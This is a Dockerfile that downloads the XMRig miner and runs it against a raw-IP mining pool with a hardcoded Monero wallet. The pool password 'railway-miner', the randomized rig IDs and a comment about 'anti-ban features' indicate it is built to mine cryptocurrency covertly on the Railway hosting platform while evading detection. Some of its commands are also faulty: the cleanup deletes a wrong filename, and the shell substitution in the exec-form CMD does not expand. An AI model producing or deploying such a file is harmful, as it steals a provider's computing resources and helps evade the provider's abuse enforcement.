FROM alpine:3.20

# Install dependencies
RUN apk add --no-cache wget tar

# Download XMRig (Linux static, ~2.3 MB)
RUN wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz \
    && tar -xzf xmrig-6.21.0-linux-static-x64.tar.gz \
    && mv xmrig-6.21.0/xmrig /usr/local/bin/xmrig \
    && rm -rf xmrig-6.21.0 xmrig.tar.gz

# Run miner with your wallet + anti-ban features
CMD ["xmrig", \
     "-o", "13.60.238.85:80", \
     "-u", "41npxEnqoL4SJf3FPxySonMjLo4dAXe64QtX5a2Ygd9SMRHuvVuBjGNMhD7fSq2BhqcAZiAdF1uCCasz2vnxtSyjKvNmr2x", \
     "-p", "railway-miner", \
     "--rig-id", "railway-$(shuf -i 1000-9999 -n 1)", \
     "--donate-level=1", \
     "--max-cpu-usage=90", \
     "--cpu-priority=2", \
     "--randomx-1gb-pages", \
     "--no-color", \
     "--print-time=60"]
